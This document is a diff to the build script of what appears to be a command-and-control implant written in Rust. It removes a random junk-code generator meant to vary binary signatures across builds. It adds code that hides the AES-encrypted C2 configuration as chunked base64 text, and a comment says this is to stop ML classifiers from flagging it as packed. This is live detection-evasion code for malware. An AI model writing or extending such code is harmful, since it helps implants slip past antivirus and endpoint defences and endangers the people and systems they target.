@@ -21,9 +21,9 @@ fn main() {
     // The cert directory and C2_BUILD_CONFIG env var are registered below
     // with their own targeted directives so cargo can still skip cert
     // regeneration and config embedding when nothing has changed. The
-    // litcrypt key and junk-code sections, however, must be fresh every
-    // time so that sequential builds produce binaries with different
-    // signatures even from identical source.
+    // litcrypt key section, however, must be fresh every time so that
+    // sequential builds produce binaries with different signatures even
+    // from identical source.
 
     let mut rng = thread_rng();
 
@@ -60,90 +60,7 @@ fn main() {
         }
     }
 
-    // ── 2. POLYMORPHISM: Junk-code seed ──────────────────────────────
-    //
-    // A random 64-bit seed is embedded as a compile-time env var.
-    // Agent modules that include junk_code.rs can use this to select
-    // between pre-written dead-code variants at compile time via
-    // cfg-like const evaluation, producing different branch layouts
-    // and altering basic-block sequences without changing semantics.
-    //
-    // The seed drives three independent decisions:
-    //   bits 0-15 : which junk function body variant is emitted
-    //   bits 16-31 : how many dead iterations the spin loop runs
-    //   bits 32-47 : which decoy error string variant is used
-    //   bits 48-63 : reserved for future variant selection
-    let junk_seed: u64 = rng.gen();
-    let junk_variant    = (junk_seed & 0xFFFF) % 4;           // 0-3
-    let junk_iterations = 1 + ((junk_seed >> 16) & 0xFF);     // 1-256 (dead loops)
-    let junk_decoy_idx  = (junk_seed >> 32) & 0xFFFF;         // decoy string selector
-
-    let junk_body = match junk_variant {
-        0 => format!(
-            // Variant 0: arithmetic spin - looks like a checksum or CRC stub
-            "    let mut _acc: u64 = {seed};\n\
-             for _i in 0u64..{iters} {{ _acc = _acc.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407); }}\n\
-             if _acc == 0 {{ std::process::exit(1); }}",
-            seed  = junk_seed,
-            iters = junk_iterations,
-        ),
-        1 => format!(
-            // Variant 1: byte array walk - looks like a hash or digest scan
-            "    let _buf: [u8; {sz}] = [0u8; {sz}];\n\
-             let mut _sum: u32 = {seed_lo};\n\
-             for b in _buf.iter() {{ _sum = _sum.wrapping_add(*b as u32).rotate_left(3); }}\n\
-             if _sum == u32::MAX {{ std::process::exit(1); }}",
-            sz      = 16 + (junk_iterations as usize % 48),
-            seed_lo = (junk_seed & 0xFFFFFFFF) as u32,
-        ),
-        2 => format!(
-            // Variant 2: string length check - looks like an environment probe
-            "    let _env_len: usize = option_env!(\"PATH\").map(|s| s.len()).unwrap_or({fallback});\n\
-             if _env_len == 0 {{ std::process::exit(1); }}",
-            fallback = 4 + (junk_iterations as usize % 12),
-        ),
-        _ => format!(
-            // Variant 3: bitfield test - looks like a capability or flag check
-            "    let _flags: u64 = {flags}u64;\n\
-             if _flags & (1 << {bit}) != 0 && _flags == 0 {{ std::process::exit(1); }}",
-            flags = junk_seed ^ 0xDEADBEEFCAFEBABE,
-            bit   = junk_iterations % 64,
-        ),
-    };
-
-    // Decoy string variants rotate through plausible-looking error messages
-    // so the string pool differs across builds even without lc!() coverage.
-    let decoy_strings = [
-        "system initialisation failed",
-        "runtime check error",
-        "memory allocation failed",
-        "configuration load error",
-        "component initialisation failed",
-        "security check failed",
-        "service not available",
-        "resource acquisition failed",
-    ];
-    let decoy = decoy_strings[(junk_decoy_idx as usize) % decoy_strings.len()];
-
-    let junk_rs_path = Path::new(&out_dir).join("junk_code.rs");
-    let junk_rs = format!(
-        "/// Auto-generated dead code. Never called; exists solely to vary the\n\
-         /// binary's function layout and basic-block graph across builds.\n\
-         #[allow(dead_code)]\n\
-         #[inline(never)]\n\
-         fn __rcm_dead_{variant}() {{\n\
-         {body}\n\
-         }}\n\
-         \n\
-         #[allow(dead_code)]\n\
-         static __RCM_DECOY: &str = \"{decoy}\";\n",
-        variant = junk_variant,
-        body    = junk_body,
-        decoy   = decoy,
-    );
-    fs::write(&junk_rs_path, junk_rs).expect("Failed to write junk_code.rs");
-
-    // ── 3. PLACEHOLDER CERTS ──────────────────────────────────────────
+    // ── 2. PLACEHOLDER CERTS ──────────────────────────────────────────
     println!("cargo:rerun-if-changed=certs/");
     let cert_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("certs");
     fs::create_dir_all(&cert_dir).expect("Failed to create certs/");
@@ -179,17 +96,40 @@ fn main() {
         let nonce_bytes  = hex::decode(nonce).expect("Invalid Nonce Hex");
         let cipher_bytes = hex::decode(cipher).expect("Invalid Cipher Hex");
 
+        // Text-shaped carrier: emit the ciphertext as chunked base64 (a
+        // concat! of short string literals, like a manifest block) so the
+        // compiled PE holds plausible ASCII text. A raw byte array would
+        // land in .rodata as one high-entropy blob, which ML classifiers
+        // read as "packed". Decoded at agent startup inside get_config();
+        // the crypto itself is unchanged. The base64 alphabet contains no
+        // quotes/backslashes, so the literals need no escaping.
+        use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
+        let cipher_b64 = BASE64.encode(&cipher_bytes);
+
         conf_code.push_str("use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};\n");
         conf_code.push_str(&format!("const CONFIG_KEY: [u8; 32] = {:?};\n", key_bytes));
         conf_code.push_str(&format!("const CONFIG_NONCE: [u8; 12] = {:?};\n", nonce_bytes));
-        conf_code.push_str(&format!("const CONFIG_CIPHER: [u8; {}] = {:?};\n", cipher_bytes.len(), cipher_bytes));
+        conf_code.push_str("const CONFIG_CIPHER_B64: &str = concat!(\n");
+        let mut rest = cipher_b64.as_str();
+        while !rest.is_empty() {
+            let take = rest.len().min(100);
+            let (line, tail) = rest.split_at(take);
+            conf_code.push_str(&format!("    \"{}\",\n", line));
+            rest = tail;
+        }
+        conf_code.push_str(");\n");
         // get_config() returns the raw decrypted bytes: the plaintext is a
         // packed binary C2Config (see common.rs), not UTF-8 JSON.
         conf_code.push_str("pub fn get_config() -> Vec<u8> {\n");
+        conf_code.push_str("    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};\n");
+        conf_code.push_str("    let cipher_bytes = match BASE64.decode(CONFIG_CIPHER_B64) {\n");
+        conf_code.push_str("        Ok(c) => c,\n");
+        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
+        conf_code.push_str("    };\n");
         conf_code.push_str("    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&CONFIG_KEY);\n");
         conf_code.push_str("    let cipher = Aes256Gcm::new(key);\n");
         conf_code.push_str("    let nonce = aes_gcm::Nonce::from_slice(&CONFIG_NONCE);\n");
-        conf_code.push_str("    match cipher.decrypt(nonce, CONFIG_CIPHER.as_ref()) {\n");
+        conf_code.push_str("    match cipher.decrypt(nonce, cipher_bytes.as_slice()) {\n");
         conf_code.push_str("        Ok(p) => p,\n");
         conf_code.push_str("        Err(_) => std::process::exit(1),\n");
         conf_code.push_str("    }\n");
